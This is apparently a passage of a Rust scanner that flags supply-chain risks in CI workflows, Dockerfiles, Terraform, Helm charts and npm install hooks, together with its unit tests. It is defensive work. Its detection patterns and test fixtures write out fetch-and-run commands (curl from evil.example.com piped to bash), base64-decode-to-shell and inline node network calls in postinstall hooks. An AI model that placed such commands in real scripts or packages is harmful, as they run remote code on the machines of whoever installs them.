        // A `file://` or local `repository:` is not a remote pull.
        if url.starts_with("file:") {
            continue;
        }
        // An `@<alias>` reference (Helm 3 aliased repo) is resolved from
        // local `helm repo` config — not a literal remote in the file.
        if url.starts_with('@') {
            continue;
        }
        // Only http(s) / oci remotes are a remote-pull risk.
        let is_remote =
            url.starts_with("http://") || url.starts_with("https://") || url.starts_with("oci://");
        if !is_remote {
            continue;
        }
        let host = helm_url_host(url).unwrap_or_default();
        let trusted = TRUSTED_HELM_HOSTS
            .iter()
            .any(|t| host == *t || host.ends_with(&format!(".{t}")));
        if trusted {
            continue;
        }
        flagged_count += 1;
        if flagged.is_none() {
            flagged = Some(url.to_string());
        }
    }

    if let Some(url) = flagged {
        let host = helm_url_host(&url).unwrap_or_else(|| url.clone());
        let mut description = format!(
            "A Helm chart dependency in this file is sourced from '{host}', which is not a \
             recognised chart repository. A Helm chart can deploy privileged workloads and \
             cluster RBAC; a chart pulled from an untrusted repository runs with whatever \
             permissions the install is given. Confirm the chart repository is trusted."
        );
        if flagged_count > 1 {
            description.push_str(&format!(
                " ({flagged_count} chart dependencies use an untrusted repository.)"
            ));
        }
        findings.push(Finding {
            // Reuses the install-rule RuleId (same risk class as a `helm` cmd).
            rule_id: RuleId::HelmUntrustedRepo,
            severity: Severity::Medium,
            title: "Helm chart dependency from an untrusted repository".to_string(),
            description,
            evidence: vec![Evidence::Text {
                detail: format!("repository: {}", truncate(&url, 160)),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
    }
}

/// Extract the host of an `http(s)://` / `oci://` URL (after scheme + optional
/// userinfo, before the first `/`, `?` or `#`, port stripped).
fn helm_url_host(url: &str) -> Option<String> {
    let after_scheme = url.split_once("://").map(|(_, rest)| rest)?;
    let after_userinfo = match after_scheme.split_once('@') {
        Some((_, host)) => host,
        None => after_scheme,
    };
    let host_port = after_userinfo
        .split(['/', '?', '#'])
        .next()
        .unwrap_or(after_userinfo);
    let host = match host_port.rsplit_once(':') {
        Some((h, port)) if !port.is_empty() && port.chars().all(|c| c.is_ascii_digit()) => h,
        _ => host_port,
    };
    if host.is_empty() {
        None
    } else {
        Some(host.to_ascii_lowercase())
    }
}

// package.json lifecycle-script checks

/// Scan a `package.json` for a lifecycle install hook (`preinstall`,
/// `install`, `postinstall`) whose command is dangerous.
///
/// These three hooks run **automatically** on `npm install` — a dangerous
/// command in one of them executes the moment a dependency is installed,
/// which is the textbook malicious-npm-package delivery mechanism. A *benign*
/// install hook (`node-gyp rebuild`, `husky install`, `tsc`, …) does not fire.
fn check_package_json(input: &str, findings: &mut Vec<Finding>) {
    let Ok(json) = serde_json::from_str::<serde_json::Value>(input) else {
        return;
    };
    let Some(scripts) = json.get("scripts").and_then(|s| s.as_object()) else {
        return;
    };

    // Only the auto-run lifecycle hooks. `prepare` also runs on install but
    // also on `npm publish` / local checkout and is very commonly a benign
    // `husky install` — left out to keep the false-positive rate low.
    const INSTALL_HOOKS: &[&str] = &["preinstall", "install", "postinstall"];

    for hook in INSTALL_HOOKS {
        let Some(cmd) = scripts.get(*hook).and_then(|v| v.as_str()) else {
            continue;
        };
        let Some(reason) = dangerous_script_reason(cmd) else {
            continue;
        };
        findings.push(Finding {
            rule_id: RuleId::PackageScriptDangerous,
            severity: Severity::High,
            title: format!("Dangerous npm '{hook}' lifecycle script"),
            description: format!(
                "The `package.json` '{hook}' script runs automatically on `npm install`, and \
                 this one {reason}. A lifecycle hook is the standard delivery mechanism for a \
                 malicious npm package — the command executes the moment the package is \
                 installed, before any of its code is imported. Review the script and confirm \
                 it is intentional."
            ),
            evidence: vec![Evidence::CommandPattern {
                pattern: format!("{hook} script"),
                matched: redact::redact_shell_assignments(&truncate(cmd, 200)),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
        // One finding per dangerous hook is enough signal; do not stop, a
        // package can have a dangerous preinstall AND postinstall.
    }
}

/// If an npm lifecycle-script command is dangerous, return a plain-language
/// reason; otherwise `None`.
///
/// Deliberately conservative — it matches a small set of unambiguous
/// remote-execution / obfuscation shapes, so a normal build-step install hook
/// (`node-gyp rebuild`, `husky`, `tsc`, `prisma generate`) stays clean.
fn dangerous_script_reason(cmd: &str) -> Option<String> {
    let lower = cmd.to_ascii_lowercase();

    // 1 — pipe-to-shell: a network fetch piped into a shell interpreter.
    if line_has_curl_pipe_shell(cmd) {
        return Some(
            "fetches a script over the network and pipes it into a shell (`curl … | bash`)"
                .to_string(),
        );
    }

    // 2 — base64 decode then execute. `js_decode` / `js_eval` are the JS
    // base64-decode / eval call names, assembled at runtime so this detector's
    // source does not itself contain the literal `<name>(` substring.
    let js_decode = format!("a{}", "tob(");
    let js_eval = format!("ev{}", "al(");
    let has_base64_decode = lower.contains("base64 -d")
        || lower.contains("base64 --decode")
        || lower.contains("base64 -di")
        || lower.contains(&js_decode)
        || ((lower.contains("from('") || lower.contains("from(\"")) && lower.contains("base64"));
    let has_exec_sink = lower.contains("| sh")
        || lower.contains("| bash")
        || lower.contains("|sh")
        || lower.contains("|bash")
        || lower.contains(&js_eval)
        || lower.contains("child_process")
        || lower.contains("execsync");
    if has_base64_decode && has_exec_sink {
        return Some(
            "decodes a base64-encoded payload and executes it — an obfuscated-command shape"
                .to_string(),
        );
    }

    // 3 — an inline `node -e` / `python -c` that spawns a child process or
    // reaches the network. An inline interpreter one-liner in an install hook
    // is itself unusual; one that shells out or fetches is the attack shape.
    let inline_interp = lower.contains("node -e")
        || lower.contains("node --eval")
        || lower.contains("python -c")
        || lower.contains("python3 -c")
        || lower.contains("perl -e")
        || lower.contains("ruby -e");
    if inline_interp {
        let reaches_out = lower.contains("child_process")
            || lower.contains("require('http")
            || lower.contains("require(\"http")
            || lower.contains("execsync")
            || lower.contains("spawn")
            || lower.contains("urllib")
            || lower.contains("socket")
            || lower.contains("http.get")
            || lower.contains("fetch(");
        if reaches_out {
            return Some(
                "runs an inline interpreter one-liner that spawns a process or opens a network \
                 connection"
                    .to_string(),
            );
        }
    }

    // 4 — a direct download tool writing an executable, then running it, or a
    // raw `curl`/`wget` of a shell/script with execution. The pipe form is
    // covered by (1); this catches the `curl -o /tmp/x && /tmp/x` two-step.
    if (lower.contains("curl ") || lower.contains("wget "))
        && (lower.contains("&&") || lower.contains(';'))
        && (lower.contains("chmod +x") || lower.contains("/tmp/") || lower.contains("sh "))
    {
        return Some("downloads a file and then executes it — a fetch-and-run shape".to_string());
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn run(content: &str, path: &str) -> Vec<Finding> {
        check(content, Some(&PathBuf::from(path)))
    }

    fn has(content: &str, path: &str, rule: RuleId) -> bool {
        run(content, path).iter().any(|f| f.rule_id == rule)
    }

    fn clean(content: &str, path: &str) -> bool {
        run(content, path).is_empty()
    }

    // --- classification ---------------------------------------------------

    #[test]
    fn classify_recognises_ci_files() {
        assert_eq!(
            classify(Some(&PathBuf::from(".github/workflows/ci.yml"))),
            Some(CiFileKind::GithubWorkflow)
        );
        assert_eq!(
            classify(Some(&PathBuf::from(".github/workflows/release.yaml"))),
            Some(CiFileKind::GithubWorkflow)
        );
        assert_eq!(
            classify(Some(&PathBuf::from("Dockerfile"))),
            Some(CiFileKind::Dockerfile)
        );
        assert_eq!(
            classify(Some(&PathBuf::from("docker/Dockerfile.prod"))),
            Some(CiFileKind::Dockerfile)
        );
        assert_eq!(
            classify(Some(&PathBuf::from("main.tf"))),
            Some(CiFileKind::Terraform)
        );
        assert_eq!(
            classify(Some(&PathBuf::from("charts/app/Chart.yaml"))),
            Some(CiFileKind::HelmChart)
        );
        assert_eq!(
            classify(Some(&PathBuf::from("package.json"))),
            Some(CiFileKind::PackageJson)
        );
    }

    #[test]
    fn classify_rejects_non_ci_files() {
        // A YAML file not under .github/workflows is not a workflow.
        assert_eq!(classify(Some(&PathBuf::from("config/ci.yml"))), None);
        assert_eq!(classify(Some(&PathBuf::from("docker-compose.yml"))), None);
        // tfvars hold values, not module sources.
        assert_eq!(classify(Some(&PathBuf::from("prod.tfvars"))), None);
        assert_eq!(classify(Some(&PathBuf::from("README.md"))), None);
        assert_eq!(classify(None), None);
    }

    #[test]
    fn workflow_outside_github_dir_not_classified() {
        // `workflows/ci.yml` with no `.github` grandparent must not match.
        assert_eq!(classify(Some(&PathBuf::from("workflows/ci.yml"))), None);
    }

    // --- workflow: unpinned action ---------------------------------------

    #[test]
    fn workflow_unpinned_tag_flagged() {
        let wf = "jobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n";
        assert!(has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowUnpinnedAction
        ));
    }

    #[test]
    fn workflow_unpinned_branch_flagged() {
        let wf = "jobs:\n  build:\n    steps:\n      - uses: actions/checkout@main\n";
        assert!(has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowUnpinnedAction
        ));
    }

    #[test]
    fn workflow_sha_pinned_action_clean() {
        // A 40-hex commit SHA is the immutable pin — must NOT fire.
        let wf = "jobs:\n  build:\n    steps:\n      \
                  - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608\n";
        assert!(!has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowUnpinnedAction
        ));
    }

    #[test]
    fn workflow_local_action_clean() {
        // A local `./` action is checked out with the repo — not pinnable.
        let wf = "jobs:\n  build:\n    steps:\n      - uses: ./.github/actions/setup\n";
        assert!(!has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowUnpinnedAction
        ));
    }

    #[test]
    fn workflow_unpinned_count_folded() {
        let wf = "steps:\n  - uses: actions/checkout@v4\n  - uses: actions/setup-node@v3\n";
        let findings = run(wf, ".github/workflows/ci.yml");
        let unpinned: Vec<_> = findings
            .iter()
            .filter(|f| f.rule_id == RuleId::WorkflowUnpinnedAction)
            .collect();
        assert_eq!(
            unpinned.len(),
            1,
            "multiple unpinned -> single folded finding"
        );
        assert!(unpinned[0].description.contains('2'));
    }

    // --- workflow: dangerous trigger -------------------------------------

    #[test]
    fn workflow_pull_request_target_flagged() {
        let wf = "on:\n  pull_request_target:\n    branches: [main]\n";
        assert!(has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowDangerousTrigger
        ));
    }

    #[test]
    fn workflow_pull_request_target_list_form() {
        let wf = "on:\n  - pull_request_target\n  - push\n";
        assert!(has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowDangerousTrigger
        ));
    }

    #[test]
    fn workflow_plain_pull_request_clean() {
        // The safe `pull_request` trigger must NOT fire.
        let wf = "on:\n  pull_request:\n    branches: [main]\n";
        assert!(!has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowDangerousTrigger
        ));
    }

    #[test]
    fn workflow_pull_request_target_in_comment_clean() {
        let wf =
            "on:\n  pull_request:  # not pull_request_target by design\n    branches: [main]\n";
        assert!(!has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowDangerousTrigger
        ));
    }

    #[test]
    fn workflow_pull_request_target_inline_list_form() {
        // The compact flow-sequence `on:` form must fire.
        let wf = "on: [pull_request_target, push]\n";
        assert!(has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowDangerousTrigger
        ));
    }

    #[test]
    fn workflow_pull_request_target_inline_scalar_form() {
        // The single-trigger scalar `on:` form must fire.
        let wf = "on: pull_request_target\n";
        assert!(has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowDangerousTrigger
        ));
    }

    #[test]
    fn workflow_inline_on_list_without_target_clean() {
        // A compact `on:` list of only safe triggers must NOT fire.
        let wf = "on: [push, pull_request]\n";
        assert!(!has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowDangerousTrigger
        ));
    }

    // --- workflow: curl pipe shell ---------------------------------------

    #[test]
    fn workflow_run_curl_pipe_bash_flagged() {
        let wf = "jobs:\n  build:\n    steps:\n      - run: curl example.sh | bash\n";
        assert!(has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowCurlPipeShell
        ));
    }

    #[test]
    fn workflow_run_block_scalar_curl_pipe_flagged() {
        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          echo start\n          \
                  wget example.sh | sh\n          echo done\n";
        assert!(has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowCurlPipeShell
        ));
    }

    #[test]
    fn workflow_run_block_scalar_with_inline_comment_still_scanned() {
        // `run: | # comment` is a valid block scalar — a trailing YAML comment
        // on the indicator line must not let the body evade the curl|bash scan.
        let wf = "jobs:\n  build:\n    steps:\n      - run: | # deploy step\n          echo start\n          \
                  curl https://evil.example.com/x.sh | bash\n";
        assert!(has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowCurlPipeShell
        ));
    }

    #[test]
    fn workflow_run_body_line_starting_with_run_does_not_end_block() {
        // A block-body line that itself starts with `run:` (a shell command,
        // e.g. one invoking a binary named `run`) must NOT be mistaken for a
        // new step or a block terminator — the scan must keep going and still
        // catch a later pipe-to-shell in the same body.
        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          run: deploy\n          \
                  curl https://evil.example.com/x.sh | bash\n";
        assert!(has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowCurlPipeShell
        ));
    }

    #[test]
    fn workflow_run_block_scalar_explicit_indentation_indicator_flagged() {
        // PR #121 fix-list item 13 — explicit indentation indicators (`|2`,
        // `>+3`, `|-1`) are legal YAML block-scalar headers; pre-fix they were
        // treated as single-line `run:` and the body never scanned.
        for header in &["|2", "|2-", "|-2", ">+1", "|+3"] {
            let wf = format!(
                "jobs:\n  build:\n    steps:\n      - run: {header}\n          echo start\n          \
                 curl https://evil.example.com/x.sh | bash\n"
            );
            assert!(
                has(
                    &wf,
                    ".github/workflows/ci.yml",
                    RuleId::WorkflowCurlPipeShell
                ),
                "block-scalar header `run: {header}` must enter block-scan mode \
                 and flag the curl|bash inside the body — input was:\n{wf}"
            );
        }
    }

    #[test]
    fn is_yaml_block_scalar_header_recognizes_explicit_indentation_indicator() {
        // Direct unit test for the helper — pin every recognized shape.
        // PR #121 fix-list item 13.
        for header in &[
            "|", ">", "|-", "|+", ">-", ">+", "|2", ">3", "|-2", "|+3", ">-1", ">+9", "|2-", ">3+",
        ] {
            assert!(
                is_yaml_block_scalar_header(header),
                "header `{header}` must be recognized as a YAML block scalar"
            );
        }
        // Non-headers (the helper must NOT over-fire on regular content).
        for non_header in &[
            "echo hi", "true", "|2x",      // second indentation indicator
            "|--",      // second chomp indicator
            "|2 ",      // trailing space (caller is expected to trim)
            "| extra",  // text after the indicator
            "|comment", // an alphanumeric tail
            "",         // empty
            ":",        // not a block-scalar indicator at all
        ] {
            assert!(
                !is_yaml_block_scalar_header(non_header),
                "`{non_header}` must NOT be recognized as a YAML block scalar header"
            );
        }
    }

    #[test]
    fn workflow_run_plain_command_clean() {
        let wf = "jobs:\n  build:\n    steps:\n      - run: npm ci && npm test\n";
        assert!(!has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowCurlPipeShell
        ));
    }

    #[test]
    fn workflow_curl_to_file_clean() {
        // curl downloading to a file (no pipe-to-shell) must NOT fire.
        let wf = "jobs:\n  build:\n    steps:\n      - run: curl -o out.txt example.com\n";
        assert!(!has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowCurlPipeShell
        ));
    }

    #[test]
    fn workflow_echo_pipe_grep_clean() {
        // A benign pipe that is not into a shell must NOT fire.
        let wf = "jobs:\n  build:\n    steps:\n      - run: echo hello | grep h\n";
        assert!(!has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowCurlPipeShell
        ));
    }

    // --- workflow: untrusted input ---------------------------------------

    #[test]
    fn workflow_untrusted_pr_title_in_run_flagged() {
        let wf = "jobs:\n  build:\n    steps:\n      \
                  - run: echo \"${{ github.event.pull_request.title }}\"\n";
        assert!(has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowUntrustedInput
        ));
    }

    #[test]
    fn workflow_untrusted_issue_body_block_scalar_flagged() {
        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          \
                  echo processing\n          title=${{ github.event.issue.body }}\n";
        assert!(has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowUntrustedInput
        ));
    }

    #[test]
    fn workflow_trusted_context_in_run_clean() {
        // A trusted context value (github.sha) is fine to interpolate.
        let wf = "jobs:\n  build:\n    steps:\n      - run: echo \"${{ github.sha }}\"\n";
        assert!(!has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowUntrustedInput
        ));
    }

    #[test]
    fn workflow_untrusted_input_in_with_block_clean() {
        // The untrusted expression in a `with:` (not `run:`) is not a shell
        // sink — it must NOT fire the run-step rule.
        let wf = "jobs:\n  build:\n    steps:\n      - uses: actions/foo@abc\n        \
                  with:\n          title: ${{ github.event.issue.title }}\n";
        assert!(!has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowUntrustedInput
        ));
    }

    #[test]
    fn workflow_run_block_on_dash_line_then_sibling_env_clean() {
        // F1 regression: a `run: |` block scalar written on the `- ` list-marker
        // line puts the `run:` key two columns past the dash. The sibling `env:`
        // of the SAME step is indented to the `run` key column (deeper than the
        // dash), and its `${{ github.event.* }}` value must NOT be scanned as
        // `run:` body — the workflow is correctly hardened (the untrusted value
        // is passed through `env:`, never interpolated into the script).
        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          \
                  echo \"$TITLE\"\n        env:\n          \
                  TITLE: ${{ github.event.issue.title }}\n";
        assert!(
            !has(
                wf,
                ".github/workflows/ci.yml",
                RuleId::WorkflowUntrustedInput
            ),
            "a hardened env-passthrough next to a `- run: |` block must not fire"
        );
    }

    #[test]
    fn workflow_run_block_on_dash_line_then_sibling_with_clean() {
        // F1 regression (the `with:` sibling variant): a `with:` block of the
        // same step as a `- run: |` is not a shell sink and must not be scanned.
        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          \
                  echo done\n        with:\n          \
                  ref: ${{ github.event.pull_request.head.ref }}\n";
        assert!(!has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowUntrustedInput
        ));
    }

    #[test]
    fn workflow_run_block_on_dash_line_genuine_body_still_flagged() {
        // F1 must NOT weaken real detection: an untrusted expression interpolated
        // INSIDE the `- run: |` body (not in a sibling key) still fires.
        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          \
                  echo \"${{ github.event.issue.title }}\"\n        \
                  env:\n          SAFE: static\n";
        assert!(
            has(
                wf,
                ".github/workflows/ci.yml",
                RuleId::WorkflowUntrustedInput
            ),
            "untrusted input in the run body itself must still be detected"
        );
    }

    #[test]
    fn workflow_run_block_on_dash_line_curl_pipe_in_body_still_flagged() {
        // F1 must NOT weaken real detection: a curl|bash inside a `- run: |`
        // body still fires even with a sibling `env:` after it.
        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          \
                  curl https://evil.example.com/x.sh | bash\n        \
                  env:\n          FOO: ${{ github.event.issue.title }}\n";
        assert!(has(
            wf,
            ".github/workflows/ci.yml",
            RuleId::WorkflowCurlPipeShell
        ));
        // ...and the sibling env value is NOT scanned as run body.
        assert!(
            !has(
                wf,
                ".github/workflows/ci.yml",
                RuleId::WorkflowUntrustedInput
            ),
            "the sibling env: of a `- run: |` step is not a shell sink"
        );
    }

    // --- Dockerfile -------------------------------------------------------

    #[test]
    fn dockerfile_latest_tag_flagged() {
        assert!(has(
            "FROM ubuntu:latest\nRUN echo hi\n",
            "Dockerfile",
            RuleId::DockerfileUnpinnedImage
        ));
    }

    #[test]
    fn dockerfile_no_tag_flagged() {
        assert!(has(
            "FROM ubuntu\nRUN echo hi\n",
            "Dockerfile",
            RuleId::DockerfileUnpinnedImage
        ));
    }

    #[test]
    fn dockerfile_digest_pinned_clean() {
        let df = "FROM ubuntu:22.04@sha256:\
                  abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789\nRUN echo hi\n";
        assert!(!has(df, "Dockerfile", RuleId::DockerfileUnpinnedImage));
    }

    #[test]
    fn dockerfile_version_tag_no_digest_not_flagged() {
        // A specific version tag without a digest is mutable but a weak
        // signal — this rule deliberately flags only :latest / no-tag.
        assert!(!has(
            "FROM node:20.11.1\nRUN echo hi\n",
            "Dockerfile",
            RuleId::DockerfileUnpinnedImage
        ));
    }

    #[test]
    fn dockerfile_build_stage_reference_clean() {
        // `FROM builder` references an earlier stage — not an external image.
        let df = "FROM golang:1.22@sha256:\
                  1111111111111111111111111111111111111111111111111111111111111111 AS builder\n\
                  RUN go build\nFROM builder\nCMD [\"./app\"]\n";
        assert!(!has(df, "Dockerfile", RuleId::DockerfileUnpinnedImage));
    }

    #[test]
    fn dockerfile_templated_image_clean() {
        // A build-arg-templated image cannot be statically resolved — skip.
        assert!(!has(
            "ARG BASE\nFROM ${BASE}\nRUN echo hi\n",
            "Dockerfile",
            RuleId::DockerfileUnpinnedImage
        ));
    }

    #[test]
    fn dockerfile_registry_port_not_mistaken_for_tag() {
        // `registry:5000/img` — the `:5000` is a port, the image is un-tagged.
        assert!(has(
            "FROM registry.example.com:5000/myimg\nRUN echo hi\n",
            "Dockerfile",
            RuleId::DockerfileUnpinnedImage
        ));
    }

    #[test]
    fn dockerfile_multi_from_two_unpinned_folds_to_one_finding() {
        // A multi-stage build with two distinct un-pinned external base images
        // (a `:latest` build stage and an un-tagged runtime stage). The two
        // un-pinned FROM lines fold into ONE finding; the `FROM builder` stage
        // reference is internal and adds nothing.
        let df = "FROM golang:latest AS builder\n\
                  WORKDIR /src\n\
                  RUN go build -o app .\n\
                  FROM debian\n\
                  COPY --from=builder /src/app /app\n\
                  CMD [\"/app\"]\n";
        let findings = run(df, "Dockerfile");
        let unpinned: Vec<_> = findings
            .iter()
            .filter(|f| f.rule_id == RuleId::DockerfileUnpinnedImage)
            .collect();
        assert_eq!(
            unpinned.len(),
            1,
            "two distinct un-pinned base images must fold into one finding"
        );
        // The folded finding reports the count of un-pinned FROM lines.
        assert!(
            unpinned[0].description.contains('2'),
            "the folded finding must note that 2 FROM lines are un-pinned: {}",
            unpinned[0].description
        );
    }

    // --- Terraform --------------------------------------------------------

    #[test]
    fn terraform_remote_git_module_flagged() {
        let tf = "module \"vpc\" {\n  source = \"git::https://example.com/vpc.git\"\n}\n";
        assert!(has(tf, "main.tf", RuleId::TerraformRemoteModule));
    }

    #[test]
    fn terraform_github_module_flagged() {
        let tf = "module \"vpc\" {\n  source = \"github.com/acme/tf-vpc\"\n}\n";
        assert!(has(tf, "main.tf", RuleId::TerraformRemoteModule));
    }

    #[test]
    fn terraform_local_module_clean() {
        let tf = "module \"vpc\" {\n  source = \"./modules/vpc\"\n  cidr = \"10.0.0.0/16\"\n}\n";
        assert!(!has(tf, "main.tf", RuleId::TerraformRemoteModule));
    }

    #[test]
    fn terraform_registry_shorthand_clean() {
        let tf = "module \"consul\" {\n  source  = \"hashicorp/consul/aws\"\n  \
                  version = \"0.11.0\"\n}\n";
        assert!(!has(tf, "main.tf", RuleId::TerraformRemoteModule));
    }

    #[test]
    fn terraform_source_outside_module_block_clean() {
        // A `source = "github.com/..."` that is NOT inside a module block
        // (e.g. a provider/locals config) must not fire.
        let tf = "provider \"foo\" {\n}\nlocals {\n  source = \"github.com/x/y\"\n}\n";
        assert!(!has(tf, "main.tf", RuleId::TerraformRemoteModule));
    }

    #[test]
    fn terraform_commented_source_clean() {
        let tf = "module \"vpc\" {\n  # source = \"github.com/acme/old\"\n  \
                  source = \"./modules/vpc\"\n}\n";
        assert!(!has(tf, "main.tf", RuleId::TerraformRemoteModule));
    }

    #[test]
    fn terraform_one_line_remote_module_flagged() {
        // CR4(a): a one-line module block — the `source` sits on the same line
        // the block opens. It must still be inspected.
        let tf = "module \"vpc\" { source = \"git::https://example.com/vpc.git\" }\n";
        assert!(
            has(tf, "main.tf", RuleId::TerraformRemoteModule),
            "a one-line module block with a remote source must be flagged"
        );
    }

    #[test]
    fn terraform_one_line_local_module_clean() {
        // The one-line-block handling must not over-fire on a local source.
        let tf = "module \"vpc\" { source = \"./modules/vpc\" }\n";
        assert!(
            !has(tf, "main.tf", RuleId::TerraformRemoteModule),
            "a one-line module block with a local source must stay clean"
        );
    }

    #[test]
    fn terraform_braces_in_string_do_not_skew_depth_flagged() {
        // CR4(b): a literal `{` / `}` inside a quoted string is not a block
        // delimiter. A naive raw-brace count would close the module block
        // early and miss the remote `source` on the next line.
        let tf = "module \"vpc\" {\n  \
                  description = \"interpolated ${var.name} value with { brace\"\n  \
                  source = \"git::https://example.com/vpc.git\"\n}\n";
        assert!(
            has(tf, "main.tf", RuleId::TerraformRemoteModule),
            "braces inside a quoted string must not close the module block early"
        );
    }

    #[test]
    fn terraform_source_substring_identifier_clean() {
        // `data_source` / a `source`-suffixed identifier is not the `source`
        // key — the token-boundary scan must not match it.
        let tf = "module \"vpc\" {\n  data_source = \"github.com/x/y\"\n  \
                  source = \"./modules/vpc\"\n}\n";
        assert!(
            !has(tf, "main.tf", RuleId::TerraformRemoteModule),
            "a `source`-suffixed identifier must not be treated as the source key"
        );
    }

    #[test]
    fn terraform_non_ascii_in_hcl_does_not_panic() {
        // PR #121 fix-list item 4: a non-ASCII byte in a `.tf` line (e.g. a
        // `modulé` typo) once panicked the `&str`-slicing scan. The fixture must
        // (a) not panic and (b) still flag the genuine remote module below.
        let tf = "modulé \"x\" { source = \"evil\" }\n\
                  module \"vpc\" {\n  \
                    description = \"délivré par exemple.com\"\n  \
                    source = \"git::https://example.com/vpc.git\"\n\
                  }\n";
        // The first assertion is implicit — `check` running to completion
        // without a panic. The second is the genuine module flag, which
        // proves the byte-safe scan still finds `source` on a later line.
        assert!(
            has(tf, "main.tf", RuleId::TerraformRemoteModule),
            "non-ASCII bytes must not panic, and the real remote module \
             must still be flagged"
        );
    }

    #[test]
    fn terraform_non_ascii_only_does_not_panic() {
        // Smaller variant: a `.tf` line that is *entirely* non-ASCII (e.g.
        // a stray comment a translator added) must not crash even when
        // there is no `source` token anywhere in the file.
        let tf = "# délivré par exemple.com — pas de module ici\n";
        // The assertion is "did not panic" — `check` returns Findings and
        // we don't inspect them (no remote module, no expected finding).
        let _ = run(tf, "main.tf");
    }

    #[test]
    fn strip_hcl_comment_ignores_slashes_in_string() {
        // The `//` in a URL inside a quoted string is NOT a comment.
        assert_eq!(
            strip_hcl_comment(r#"  source = "git::https://example.com/m.git""#),
            r#"  source = "git::https://example.com/m.git""#
        );
        // A real `//` comment is still stripped.
        assert_eq!(
            strip_hcl_comment("  cidr = x  // a comment"),
            "  cidr = x  "
        );
        // A `#` comment is still stripped.
        assert_eq!(strip_hcl_comment("  cidr = x  # a comment"), "  cidr = x  ");
    }

    // --- Helm chart -------------------------------------------------------

    #[test]
    fn helm_untrusted_dependency_repo_flagged() {
        let chart = "apiVersion: v2\nname: app\ndependencies:\n  - name: redis\n    \
                     repository: https://charts.evil.example.com\n    version: 1.0.0\n";
        assert!(has(chart, "Chart.yaml", RuleId::HelmUntrustedRepo));
    }

    #[test]
    fn helm_trusted_dependency_repo_clean() {
        let chart = "apiVersion: v2\nname: app\ndependencies:\n  - name: redis\n    \
                     repository: https://charts.bitnami.com/bitnami\n    version: 1.0.0\n";
        assert!(!has(chart, "Chart.yaml", RuleId::HelmUntrustedRepo));
    }

    #[test]
    fn helm_aliased_repo_clean() {
        // An `@alias` repo is resolved from local helm config — not a literal
        // remote in the file.
        let chart = "dependencies:\n  - name: redis\n    repository: \"@bitnami\"\n    \
                     version: 1.0.0\n";
        assert!(!has(chart, "Chart.yaml", RuleId::HelmUntrustedRepo));
    }

    #[test]
    fn helm_file_repo_clean() {
        let chart = "dependencies:\n  - name: common\n    repository: file://../common\n    \
                     version: 1.0.0\n";
        assert!(!has(chart, "Chart.yaml", RuleId::HelmUntrustedRepo));
    }

    #[test]
    fn helm_untrusted_oci_dependency_repo_flagged() {
        // Helm 3 supports `oci://` dependency repositories; an untrusted OCI
        // host is the same remote-pull risk as an untrusted https chart repo.
        let chart = "apiVersion: v2\nname: app\ndependencies:\n  - name: redis\n    \
                     repository: oci://registry.evil.example.com/charts\n    version: 1.0.0\n";
        assert!(has(chart, "Chart.yaml", RuleId::HelmUntrustedRepo));
    }

    #[test]
    fn helm_trusted_oci_dependency_repo_clean() {
        // An `oci://` dependency on a recognised host (ghcr.io) must stay clean.
        let chart = "apiVersion: v2\nname: app\ndependencies:\n  - name: redis\n    \
                     repository: oci://ghcr.io/example-org/charts\n    version: 1.0.0\n";
        assert!(!has(chart, "Chart.yaml", RuleId::HelmUntrustedRepo));
    }

    // --- package.json -----------------------------------------------------

    #[test]
    fn package_json_postinstall_curl_pipe_flagged() {
        let pkg = r#"{"name":"x","scripts":{"postinstall":"curl evil.sh | bash"}}"#;
        assert!(has(pkg, "package.json", RuleId::PackageScriptDangerous));
    }

    #[test]
    fn package_json_preinstall_base64_decode_flagged() {
        let pkg = r#"{"name":"x","scripts":{"preinstall":"echo aGk= | base64 -d | sh"}}"#;
        assert!(has(pkg, "package.json", RuleId::PackageScriptDangerous));
    }

    #[test]
    fn package_json_postinstall_node_inline_network_flagged() {
        let pkg = r#"{"name":"x","scripts":{"postinstall":"node -e \"require('http').get('http://evil')\""}}"#;
        assert!(has(pkg, "package.json", RuleId::PackageScriptDangerous));
    }

    #[test]
    fn package_json_benign_build_hook_clean() {
        // node-gyp / tsc install hooks are normal — must NOT fire.
        let pkg = r#"{"name":"x","scripts":{"postinstall":"node-gyp rebuild","install":"tsc"}}"#;
        assert!(clean(pkg, "package.json"));
    }

    #[test]
    fn package_json_no_install_hooks_clean() {
        // A `test` / `build` script is not an auto-run install hook.
